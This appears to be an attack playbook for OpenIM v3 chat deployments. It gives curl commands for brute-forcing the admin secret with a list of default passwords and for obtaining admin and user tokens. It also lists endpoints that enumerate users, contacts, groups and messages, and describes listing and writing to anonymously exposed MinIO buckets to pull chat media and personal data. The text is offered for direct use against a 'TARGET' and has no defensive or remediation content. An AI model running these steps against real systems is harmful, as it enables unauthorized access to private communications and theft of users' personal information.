# OpenIM v3 API Enumeration and Secret Brute-Force

When a target uses OpenIM v3 for its chat system (common in Chinese app platforms).

## Discovery
- APK source reveals IM init: `apiAddr: 'https://im.{domain}'`, `wsAddr: 'wss://iml.{domain}'`
- OpenIM uses `Tuoyun-OpenIMSDK` (native plugin) or `@openim/client-sdk` (JS SDK)
- MinIO bucket for chat attachments often at `minio.{domain}/openim/`

## API Header Requirement
OpenIM v3 requires `operationID` header on ALL requests. Without it:
```json
{"errCode":1001,"errMsg":"ArgsError","errDlt":"header must have operationID"}
```
Add: `-H "operationID: test$(date +%s)"` to every request.

## Admin Token Endpoint
```bash
curl -sk 'https://im.TARGET/auth/get_admin_token' -X POST \
  -H 'Content-Type: application/json' \
  -H 'operationID: op123' \
  -d '{"secret":"SECRET","userID":"imAdmin"}'
```
Success: `{"data":{"token":"...","expireTimeSeconds":...}}`
Wrong secret: `{"errCode":1002,"errMsg":"secret invalid"}`
(Note: errCode 1002 confirms the endpoint is live and the secret format is correct.)

## Common Secrets to Try
`openIM123`, `openIMsecret`, `secret`, `openim`, `openim123`, `admin`, `admin123`, `123456`, `password`, `changeme`, `test123`, `tuoyun`, `tuoyun123`, plus target-specific: DB username, company name abbreviations.

## User Token (if admin secret unknown)
```bash
curl -sk 'https://im.TARGET/auth/get_user_token' -X POST \
  -H 'Content-Type: application/json' \
  -H 'operationID: op123' \
  -d '{"secret":"SECRET","userID":"USER_ID","platformID":5}'
```

## Key API Endpoints (all need operationID header)
- `/auth/get_admin_token` — admin token (needs secret)
- `/auth/get_user_token` — user token (needs secret + userID)
- `/auth/parse_token` — validate token
- `/user/get_users_info` — user profiles
- `/user/get_all_users_uid` — all user IDs
- `/friend/get_friend_list` — contacts
- `/group/get_joined_group_list` — groups
- `/msg/newest_seq` — message sequences
- `/user/find/public` — public user search

## MinIO Bucket Exploitation
OpenIM typically stores chat media in MinIO. If the bucket is anonymously accessible:
- List: `GET https://minio.TARGET/openim/?list-type=2&max-keys=1000`
- Objects include chat images, voice messages, videos, files
- PII extraction: text files in bucket may contain phone numbers, names, referral codes
- Anonymous WRITE test: `PUT https://minio.TARGET/openim/test.txt -d 'probe'`

## Domain Pattern
Given a base domain `example.com`, check:
- `im.example.com` — OpenIM API
- `iml.example.com` — OpenIM WebSocket (long-polling)
- `minio.example.com` — MinIO storage
- The APK `getFirstLevelDomain()` function extracts the root domain and prepends `im.`/`iml.`
